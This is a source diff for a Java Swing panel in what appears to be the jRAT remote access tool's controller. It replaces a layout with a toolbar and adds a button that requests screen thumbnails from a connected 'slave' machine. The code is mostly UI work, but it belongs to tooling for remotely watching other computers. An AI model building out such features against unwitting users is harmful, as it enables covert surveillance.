@@ -1,15 +1,17 @@
 package se.jrat.controller.ui.panels;
 
-import javax.swing.BorderFactory;
-import javax.swing.GroupLayout;
-import javax.swing.GroupLayout.Alignment;
+import java.awt.BorderLayout;
+import java.awt.event.ActionEvent;
+import java.awt.event.ActionListener;
+
+import javax.swing.JButton;
 import javax.swing.JLabel;
-import javax.swing.JPanel;
 import javax.swing.JScrollPane;
-import javax.swing.LayoutStyle.ComponentPlacement;
+import javax.swing.JToolBar;
 import javax.swing.ScrollPaneConstants;
 
 import se.jrat.controller.Slave;
+import se.jrat.controller.packets.outgoing.Packet75AllThumbnails;
 
 import com.redpois0n.graphs.monitors.MonitorListener;
 import com.redpois0n.graphs.monitors.PanelMonitors;
@@ -22,8 +24,8 @@ public class PanelControlMonitors extends PanelControlParent {
 	private PanelMonitors panelMonitors;
 	private JLabel lblXY;
 	private JLabel lblWidthHeight;
-	private JPanel panel_1;
-
+	private JButton btnThumbnails;
+	
 	public PanelControlMonitors(Slave sl) {
 		super(sl);
 
@@ -31,34 +33,23 @@ public class PanelControlMonitors extends PanelControlParent {
 		scrollPane.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_ALWAYS);
 		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
 		
-		panel_1 = new JPanel();
-		panel_1.setBorder(BorderFactory.createTitledBorder("Monitor")); 
-		GroupLayout groupLayout = new GroupLayout(this);
-		groupLayout.setHorizontalGroup(
-			groupLayout.createParallelGroup(Alignment.LEADING)
-				.addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 600, Short.MAX_VALUE)
-				.addGroup(groupLayout.createSequentialGroup()
-					.addGap(10)
-					.addComponent(panel_1, GroupLayout.PREFERRED_SIZE, 246, GroupLayout.PREFERRED_SIZE)
-					.addContainerGap())
-		);
-		groupLayout.setVerticalGroup(
-			groupLayout.createParallelGroup(Alignment.LEADING)
-				.addGroup(groupLayout.createSequentialGroup()
-					.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 196, GroupLayout.PREFERRED_SIZE)
-					.addPreferredGap(ComponentPlacement.RELATED)
-					.addComponent(panel_1, GroupLayout.DEFAULT_SIZE, 137, Short.MAX_VALUE)
-					.addContainerGap())
-		);
-		panel_1.setLayout(null);
+		JToolBar toolBar = new JToolBar();
+		toolBar.setFloatable(false);
+		
+		btnThumbnails = new JButton("Thumbnails");
+		btnThumbnails.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				slave.addToSendQueue(new Packet75AllThumbnails());
+				btnThumbnails.setText("Reload");
+			}
+		});
+		toolBar.add(btnThumbnails);
 		
 		lblXY = new JLabel("X, Y: ");
-		lblXY.setBounds(10, 23, 226, 14);
-		panel_1.add(lblXY);
+		toolBar.add(lblXY);
 		
 		lblWidthHeight = new JLabel("Width, Height:");
-		lblWidthHeight.setBounds(10, 48, 226, 14);
-		panel_1.add(lblWidthHeight);
+		toolBar.add(lblWidthHeight);
 		
 		panelMonitors = new PanelMonitors(sl.getMonitors(), false);
 		
@@ -75,18 +66,23 @@ public class PanelControlMonitors extends PanelControlParent {
 				}
 				
 				if (panel != null) {
-					lblXY.setText("X, Y: " + panel.getMonitor().getX() + ", " + panel.getMonitor().getY());
+					lblXY.setText("X, Y: " + panel.getMonitor().getX() + ", " + panel.getMonitor().getY() + "     ");
 					lblWidthHeight.setText("Width, Height: " + panel.getMonitor().getWidth() + ", " + panel.getMonitor().getHeight());
-					panel_1.setBorder(BorderFactory.createTitledBorder(panel.getMonitor().getLabel())); 
 				}
 			}
 		});
 		
 		
 		scrollPane.setViewportView(panelMonitors);
-		setLayout(groupLayout);
+		setLayout(new BorderLayout(0, 0));
+		
+		add(toolBar, BorderLayout.SOUTH);
+		add(scrollPane);
 		
 		panelMonitors.reload();
-
+	}
+	
+	public PanelMonitors getPanelMonitors() {
+		return panelMonitors;
 	}
 }
